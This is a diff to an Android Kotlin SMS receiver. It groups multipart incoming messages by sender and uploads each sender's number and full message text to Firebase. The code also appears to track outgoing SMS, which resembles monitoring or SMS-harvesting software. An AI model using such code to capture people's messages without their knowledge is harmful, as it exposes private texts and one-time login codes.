@@ -25,20 +25,46 @@ class SmsReceiver : BroadcastReceiver() {
         }
     }
 
-    private fun trackIncomingSms(intent: Intent,context: Context) {
+    private fun trackIncomingSms(intent: Intent, context: Context) {
         val bundle: Bundle? = intent.extras
         if (bundle != null) {
             val pdus = bundle["pdus"] as Array<*>
             val messages = pdus.map { SmsMessage.createFromPdu(it as ByteArray) }
+            // Grouping messages by originating address (sender)
+            val messageMap = mutableMapOf<String, StringBuilder>()
 
             for (message in messages) {
-                val sender = message.originatingAddress
+                val sender = message.originatingAddress ?: "Unknown"
                 val content = message.messageBody
-                insertSmsToFirebase(context,"Incoming",content.toString(),"1",sender)
-                logToFirebase("Incoming SMS from $sender: $content")
+
+                // Combine messages from the same sender
+                if (!messageMap.containsKey(sender)) {
+                    messageMap[sender] = StringBuilder()
+                }
+                messageMap[sender]?.append(content)
+            }
+
+            // Process the complete messages
+            for ((sender, completeMessage) in messageMap) {
+                insertSmsToFirebase(context, "Incoming", completeMessage.toString(), "1", sender)
+                logToFirebase("Incoming SMS from $sender: $completeMessage")
             }
         }
     }
+//    private fun trackIncomingSms(intent: Intent,context: Context) {
+//        val bundle: Bundle? = intent.extras
+//        if (bundle != null) {
+//            val pdus = bundle["pdus"] as Array<*>
+//            val messages = pdus.map { SmsMessage.createFromPdu(it as ByteArray) }
+//
+//            for (message in messages) {
+//                val sender = message.originatingAddress
+//                val content = message.messageBody
+//                insertSmsToFirebase(context,"Incoming",content.toString(),"1",sender)
+//                logToFirebase("Incoming SMS from $sender: $content")
+//            }
+//        }
+//    }
 
     fun startOutgoingSmsTracking(context: Context) {
         val handler = Handler()
